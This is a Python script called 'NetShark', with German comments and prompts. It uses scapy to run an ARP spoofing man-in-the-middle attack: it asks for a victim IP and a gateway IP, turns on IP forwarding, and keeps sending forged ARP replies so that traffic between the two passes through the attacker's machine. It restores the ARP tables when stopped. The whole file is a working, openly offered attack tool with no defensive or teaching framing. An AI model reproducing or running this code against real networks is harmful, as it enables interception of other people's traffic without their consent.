import sys
import time
import os
from scapy.all import *
from colorama import Fore, init

init(autoreset=True)

class NetShark:
    def __init__(self):
        pass

    def banner(self):
        os.system('clear')
        print(rf"""{Fore.BLUE}
    _   __      __  _____ __               __  
   / | / /___  / /_/ ___// /_  ____ ______/ /__
  /  |/ / _ \/ __/\__ \/ __ \/ __ `/ ___/ //_/
 / /|  /  __/ /_ ___/ / / / / /_/ / /  / ,<   
/_/ |_/\___/\__//____/_/ /_/\__,_/_/  /_/|_|  
                                              
{Fore.WHITE}   >> ARP SPOOFER & PACKET SNIFFER <<
""")

    def get_mac(self, ip):
        """Holt die MAC Adresse zu einer IP"""
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, verbose=False)
        if ans:
            return ans[0][1].hwsrc
        return None

    def spoof(self, target_ip, spoof_ip):
        """Sendet gefälschte ARP Pakete"""
        target_mac = self.get_mac(target_ip)
        if not target_mac:
            print(f"{Fore.RED}[-] Konnte MAC von {target_ip} nicht finden.")
            return False
        
        # Wir sagen dem Ziel, dass WIR die spoof_ip (Router) sind
        packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        send(packet, verbose=False)
        return True

    def restore(self, dest_ip, source_ip):
        """Stellt den Normalzustand wieder her"""
        dest_mac = self.get_mac(dest_ip)
        source_mac = self.get_mac(source_ip)
        packet = ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)
        send(packet, count=4, verbose=False)

    def run(self):
        if os.geteuid() != 0:
            print(f"{Fore.RED}[CRITICAL] NetShark benötigt Root-Rechte (sudo).")
            input("\n[ENTER] Zurück...")
            return

        self.banner()
        print(f"{Fore.WHITE}Achtung: IP Forwarding muss aktiviert sein!")
        # IP Forwarding aktivieren (damit das Opfer Internet behält)
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
        
        target_ip = input(f"{Fore.GREEN}[?] Ziel-IP (Opfer): ")
        gateway_ip = input(f"{Fore.GREEN}[?] Router-IP (Gateway): ")
        
        print(f"\n{Fore.YELLOW}[*] Starte MITM Attacke... (STRG+C zum Stoppen)")
        
        count = 0
        try:
            while True:
                # Wir täuschen beide Seiten
                s1 = self.spoof(target_ip, gateway_ip) # Sag Opfer, ich bin Router
                s2 = self.spoof(gateway_ip, target_ip) # Sag Router, ich bin Opfer
                
                if s1 and s2:
                    count += 2
                    print(f"\r{Fore.GREEN}[+] Pakete gesendet: {count}", end="")
                    time.sleep(2)
                else:
                    break
        except KeyboardInterrupt:
            print(f"\n{Fore.RED}[!] Stoppe Attacke und stelle Netzwerk wieder her...")
            self.restore(target_ip, gateway_ip)
            self.restore(gateway_ip, target_ip)
            print(f"{Fore.GREEN}[OK] Netzwerk repariert.")
            
        input("\n[ENTER] Zurück...")

if __name__ == "__main__":
    if os.geteuid() != 0:
        print("Benötigt Root (sudo)!")
    else:
        NetShark().run()
